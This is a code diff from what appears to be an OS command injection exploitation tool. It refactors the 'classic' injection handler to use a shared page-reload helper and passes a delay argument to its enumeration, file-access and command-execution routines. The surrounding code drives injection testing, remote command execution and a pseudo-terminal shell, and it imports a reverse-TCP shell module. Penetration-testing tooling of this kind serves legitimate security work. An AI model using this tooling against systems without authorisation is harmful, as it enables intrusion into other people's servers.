@@ -33,6 +33,7 @@ from src.thirdparty.colorama import Fore, Back, Style, init
 
 from src.core.requests import headers
 from src.core.shells import reverse_tcp
+from src.core.requests import requests
 from src.core.requests import parameters
 from src.core.injections.controller import checks
 
@@ -65,6 +66,7 @@ The "classic" technique on result-based OS command injection.
 The "classic" injection technique handler.
 """
 def cb_injection_handler(url, delay, filename, http_request_method):
+  
   counter = 1
   vp_flag = True
   no_result = True
@@ -161,10 +163,9 @@ def cb_injection_handler(url, delay, filename, http_request_method):
                 # Check if target host is vulnerable.
                 response, vuln_parameter = cb_injector.injection_test(payload, http_request_method, url)
 
+              # Try target page reload (if it is required).
               if settings.URL_RELOAD:
-                time.sleep(delay)
-                response = urllib.urlopen(url)
-
+                response = requests.url_reload(url, delay)
               # Evaluate test results.
               shell = cb_injector.injection_test_results(response, TAG, randvcalc)
 
@@ -269,7 +270,7 @@ def cb_injection_handler(url, delay, filename, http_request_method):
                 question_msg = "Do you want to enumerate again? [Y/n/q] > "
                 enumerate_again = raw_input("\n" + settings.print_question_msg(question_msg)).lower()
                 if enumerate_again in settings.CHOICE_YES:
-                  cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
+                  cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, delay)
                   print ""
                   break
                 elif enumerate_again in settings.CHOICE_NO: 
@@ -284,7 +285,7 @@ def cb_injection_handler(url, delay, filename, http_request_method):
                   pass
             else:
               if menu.enumeration_options():
-                cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
+                cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, delay)
           
             if not menu.file_access_options() and not menu.options.os_cmd:
               print ""
@@ -298,7 +299,7 @@ def cb_injection_handler(url, delay, filename, http_request_method):
                 sys.stdout.write(settings.print_question_msg(question_msg))
                 file_access_again = sys.stdin.readline().replace("\n","").lower()
                 if file_access_again in settings.CHOICE_YES:
-                  cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
+                  cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, delay)
                   print ""
                   break
                 elif file_access_again in settings.CHOICE_NO: 
@@ -315,14 +316,14 @@ def cb_injection_handler(url, delay, filename, http_request_method):
               if menu.file_access_options():
                 if not menu.enumeration_options():
                   print ""
-                cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
+                cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, delay)
                 print ""
               
             # Check if defined single cmd.
             if menu.options.os_cmd:
               if not menu.file_access_options():
                 print ""
-              cb_enumeration.single_os_cmd_exec(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
+              cb_enumeration.single_os_cmd_exec(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, delay)
 
             # Pseudo-Terminal shell
             go_back = False
@@ -403,12 +404,9 @@ def cb_injection_handler(url, delay, filename, http_request_method):
                     else:
                       # Command execution results.
                       response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
-                      
-                      # if need page reload
+                      # Try target page reload (if it is required).
                       if settings.URL_RELOAD:
-                        time.sleep(delay)
-                        response = urllib.urlopen(url)
-
+                        response = requests.url_reload(url, delay)
                       if menu.options.ignore_session or \
                          session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
                         # Evaluate injection results.
